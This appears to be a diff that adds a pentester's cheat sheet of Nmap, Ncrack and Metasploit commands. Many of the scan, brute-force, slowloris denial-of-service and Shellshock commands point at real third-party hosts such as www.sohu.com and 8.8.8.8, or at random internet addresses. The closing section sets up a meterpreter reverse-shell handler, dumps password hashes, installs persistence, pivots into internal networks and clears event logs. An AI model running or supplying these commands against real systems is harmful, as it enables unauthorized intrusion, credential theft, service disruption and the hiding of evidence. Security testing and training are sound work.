@@ -1,0 +1,267 @@
+NSE Script Category:
+
+auth: This category is for scripts related to user authentication
+broadcast: This is a very interesting category of scripts that use broadcast petitions to gather information
+brute: This category is for scripts that help conduct brute-force password auditing
+default: This category is for scripts that are executed when a script scan is executed( -sC )
+discovery: This category is for scripts related to host and service discovery.
+dos: This category is for scripts related to denial of service attacks
+exploit: This category is for scripts that exploit security vulnerabilities
+external: This category is for scripts that depend on a third-party service
+fuzzer: This category is for NSE scripts that are focused on fuzzing
+intrusive: This category is for scripts that might crash something or generate a lot
+           of network noise; scripts that system administrators may consider intrusive belong to this category
+malware: This category is for scripts related to malware detection
+safe: This category is for scripts that are considered safe in all situations
+version: This category is for scripts that are used for advanced versioning
+vuln: This category is for scripts related to security vulnerabilities
+ 
+ # traceroute scan
+ nmap -sn -traceroute www.sohu.com
+ 
+ nmap -sn --script dns-brute websec.mx
+ 
+ # OS detect
+ nmap -A -Pn www.sohu.com
+ nmap -O scanme.nmap.org
+ nmap -O --osscan-guess www.sohu.com
+ nmap -O -v www.sohu.com
+ 
+ # Host live detect
+ nmap -sn --script broadcast-ping 192.168.0.1/24
+ 
+ # Host port scan
+ nmap www.sohu.com
+ 
+ # Service scan
+ nmap -sV www.sohu.com
+ nmap -sV --version-intensity 9 www.sohu.com
+ 
+ # Special Protocol and port scan
+ nmap -pT:25,U:53 www.sohu.com
+ nmap -p[1-65535] www.sohu.com
+ 
+ # Convert host name to IP Addr with spec DNS server after scan. 
+ nmap --dns-servers 8.8.8.8,8.8.4.4 scanme.nmap.org
+ 
+ # Special iface to scan
+ nmap -e eth2 www.sohu.com
+ 
+ #script scan using the Nmap option -sC
+ nmap -sC www.sohu.com
+ nmap -p80 --script http-trace --script-args http-trace.path
+ nmap --script http-headers,http-title scanme.nmap.org
+ 
+ #Run all the scripts in the vuln category
+ nmap -sV --script vuln www.sohu.com
+ 
+ #Run the scripts in the version or discovery categories
+ nmap -sV --script="version,discovery" www.sohu.com
+ 
+ #Run all the scripts except for the ones in the exploit category
+ nmap -sV --script "not exploit" www.sohu.com
+ 
+ #Run all HTTP scripts except http-brute and http-slowloris
+ nmap -sV --script "(http-*) and not(http-slowloris or http-brute)" www.sohu.com
+ 
+ #Debug Run NSE script 
+ nmap -sC --script-trace www.sohu.com
+ 
+ #Add the new script
+ nmap --script-updatedb
+ 
+ #Run spec script (https://secwiki.org/w/Nmap/External_Script_Library)
+ nmap --script /root/loot/nonofficial.nse www.sohu.com
+ 
+ #RUN scan the targets loaded from an external file in Nmap.
+ nmap -iL targets.txt
+ cat targets.txt
+	192.168.1.1
+	192.168.1.20-30
+	
+ nmap --exclude-file dontscan.txt 192.168.1.1/24
+ 
+ #RUN scan IP adress range
+ nmap 192.168.1.0-255
+ nmap 192.168.*
+ nmap 192.168.1.0 192.168.1.1 192.168.1.2 ... 192.168.1.254 192.168.1.255
+ nmap -p25,80 -O -T4 192.168.1.1/24 scanme.nmap.org/24
+ nmap 192.168.1.1-255 --exclude 192.168.1.1,192.168.1.2
+ 
+ #RUN scans against random targets on the Internet
+ nmap -iR 100
+ 
+ #Run scan to find random NFS shares online((https://www.shodan.io/)
+ nmap -p2049 --open -iR 0
+ nmap -p80 --script http-headers --script-args http-max-cache-size=0
+ nmap -p80,443 -Pn -T4 --open --script http-headers,http-title,ssl-cert --script-args http
+ 
+ #Run scan and save result to file
+ nmap -oX base_results.xml -sV -Pn www.sohu.com
+ 
+ #Run respond to an ICMP echo request packet from 0.10 before with an echo reply
+ nping --icmp -c 1 --icmp-type 0 --icmp-code 0 --source-ip 192.168.0.5 --dest-ip 192.168.0.10
+ 
+ #Run ncat with Lua script 
+ ncat --lua-exec /path/to/httpd.lua --listen 8080 --keep-open
+ 
+ 
+ #Run Ncrack to guess the password
+ ncrack ssh://www.sohu.com:22
+ ncrack -U <user list file> -P <password list file> <[service-name]>://<target>:<[port-number]>
+ ncrack --save cracking-session <[service-name]>://<target>:<[port-number]>
+ ncrack --resume cracking-session <[service-name]>://<target>:<[port-number]>
+ 
+ #Run TCP SYN scan
+ nmap -sn -PS 192.168.1.1/24
+ nmap -sn -PS80,21,53 www.sohu.com
+ 
+ #Run TCP ACK scan
+ nmap -sn -PA www.sohu.com
+ nmap -sn -PA21,22-80 www.sohu.com
+ 
+ #Run UDP scan
+ nmap -sn -PU www.sohu.com
+ nmap -sn -PU21-1024 www.sohu.com
+ 
+ #Run ICMP echo request scan (-PP ICMP timestamp reply -PM address mark reply --packet-trace debug info)
+ nmap -sn -PE --packet-trace www.sohu.com
+ 
+ #Run SCTP scan or init/echo scan
+ nmap -sn -PY (-sY/-sZ) www.sohu.com
+ 
+ #Run IP protocol ping scan such as IGMP/ICMP/Ip-in-IP etc
+ nmap -sn -PO --packet-trace scanme.nmap.org
+ nmap -sn -PO1,2,17 scanme.nmap.org  (Note 1-ICMP 2-IGMP 6-TCP 17-UDP 132-SCTP)
+ nmap -sn -PO --data-length 100 scanme.nmap.org (generate 100 random data)
+ 
+ #Run ARP scan
+ nmap -sn -PR 192.168.0.1/24
+ nmap -sn -PS --packet-trace --send-ip 192.168.1.254
+ 
+ #Run MAC spoofing scan
+ nmap -sn -PR --spoof-mac <mac address> <target>
+ 
+ #Run scan combine with multi-option
+ nmap -sn --send-ip -PS21,22,23,25,80,445,443,3389,8080 -PA80,443,8080 -PO1,2,4,6 -PU631,16
+ 
+ #Run ping broacast scan
+ nmap --script broadcast-ping
+ nmap --script broadcast-ping --script-args broadcast-ping.num_probes=5
+ nmap --script broadcast-ping --script-args broadcast-ping.interface=wlan0
+ 
+ #Run IPv6 scan
+ nmap -6 scanme.nmap.org
+ nmap -6 --script targets-ipv6-multicast-slaac --script-args interface=eth1 -sn
+ nmap -6 --script targets-ipv6-multicast-mld --script-args interface=eth1 -sn
+ 
+ #Run broadcast scan to discover kinds of service
+ nmap --script broadcast -e eth1
+ nmap --script broadcast --script-args targets-sniffer.timeout 30
+ nmap --script "broadcast and not targets-*"
+ 
+ #Run scan with proxy 
+ nmap -sV -Pn -n --proxies <comma separated list of proxies> <target>
+ nmap -sV -Pn -n --proxies socks4://127.0.0.1:9050 scanme.nmap.org
+ 
+ #Run scan with spoof IP
+ nmap -p80 --script ipidseq 192.168.0.1/24
+ nmap -p80 --script ipidseq -iR 100
+ 
+ nmap -Pn -sI <zombie host> <target>
+ 
+ 
+ #Run scan to get geographical information
+ nmap -sn --script whois-* sohu.com
+ nmap --script whois-ip --script-args whois.whodb=arin+ripe+afrinic <target>
+ nmap --traceroute --script traceroute-geolocation 8.8.8.8
+ 
+ #Run scan with shodan and google's malware web reporter.
+ nmap -sn -Pn -n --script shodan-api --script-args shodan-api.apikey=<ShodanAPI KEY> 8.8.8.8
+ nmap -p80 --script http-google-malware --script-args http-google-malware.api=<API> 8.8.8.8
+ 
+ #Run scan to get mail server account
+ nmap -p <Port> --script http-grep <target>
+ nmap -sn --script hostmap-* www.sohu.com
+ nmap -sn --script hostmap-ip2hosts --script-args hostmap-ip2hosts.prefix=HOSTSFILE <target>
+ nmap --script dns-brute www.sohu.com
+ nmap --script dns-brute --script-args dns-brute.hostlist=words.txt <target>
+ nmap --script dns-brute --script-args dns-brute.threads=8 <target>
+ nmap --dns-servers 8.8.8.8,8.8.4.4 scanme.nmap.org
+ 
+ #Run scan obtain profile information from people in organizations using Gmail with Nmap.
+ nmap -sn --script google-people-enum --script-args='username=<username>,password=<password>' <target>
+ 
+ https://github.com/danielmiessler/SecLists
+ https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/vulscan.nse
+ nmap -p80 -sV --script vulscan --script-args vulscan.updatedb 8.8.8.8
+ nmap -sV --script vulscan 8.8.8.8
+ 
+ nmap -p80,443 --script http-methods,http-trace --script-args http-methods.test-all=true 8.8.8.8
+ nmap -p80,443 --script http-methods,http-trace --script-args http-methods.retest 8.8.8.8
+ nmap --script http-enum -p80,443 8.8.8.8
+ nmap -p80 --script http-userdir-enum 8.8.8.8
+ nmap -p80 --script http-brute 8.8.8.8
+ nmap -p80 --script http-brute --script-args unpwdb.timelimit=60m 8.8.8.8
+ 
+ #Run scan to detect WAF or IPS use the following command
+ nmap -p80 --script http-waf-detect,http-waf-fingerprint 8.8.8.8
+ nmap -p80 --script http-waf-detect --script-args="http-waf-detect.aggro" 8.8.8.8
+ #Run scan for XSS
+ nmap -p80 --script http-methods,http-trace --script-args http-methods.retest 8.8.8.8
+ nmap -p80 --script http-unsafe-output-escaping 8.8.8.8
+ nmap -p80 --script http-phpself-xss,http-unsafe-output-escaping 8.8.8.8 (for PHP)
+ nmap -p80 --script http-xssed 8.8.8.8
+ 
+ #Run scan for SQL injection
+ nmap -p80 --script http-sql-injection 8.8.8.8
+ nmap -p80 --script http-slowloris --max-parallelism 400 8.8.8.8
+ nmap -p80 --script http-default-accounts 8.8.8.8
+ nmap -sV --script http-shellshock 8.8.8.8
+ nmap -sV --script http-shellshock --script-args cmd=ls 8.8.8.8
+ 
+ nmap -p80 --script http-git 192.168.1.1
+ # wget -r http://target/.git/
+ # find .git -type f -name 'index.htm*' -delete
+ # git status
+ # git checkout -- .
+ 
+ nmap -p80 --script http-grep --script-args http-grep.builtins=e-mail 192.168.1.1
+ nmap -p80 --script http-grep --script-args http-grep.builtins 192.168.1.1
+ 
+ #RUn scan to only test DNS delay.
+ nmap -R -Pn -sn 8.8.8.8
+ #Display time parameter then adjust it.
+ nmap -T4 -d 192.168.1.1
+ nmap -T4 --scan-delay 1s --initial-rtt-timeout 150ms --host-timeout 15m -d scanme.nmap.org
+ nmap -sV -A -p- --host-timeout 5m 192.168.1.1
+ nping -c30 scanme.nmap.org
+ nmap -sn --max-retries 10 192.168.1.1
+ 
+ 
+ 
+ 
+ 
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.44.134;
+               set LPORT 8080; run; exit -y"
+ 
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.0.1
+set LPORT 4444
+exploit
+
+#meterpreter: this command can change current process to PID 1024.
+migrate 1024
+#meterpreter dump the password hash 
+hashdump
+#meterpreter 'run persistence' will install persistence module on hacked system
+run persistence
+
+#meterpreter clear the event log
+run autoroute -p
+run autoroute -s 192.168.20.0 255.255.255.0
+background
+run event_manager -i
+run event_manager -c
+clearev
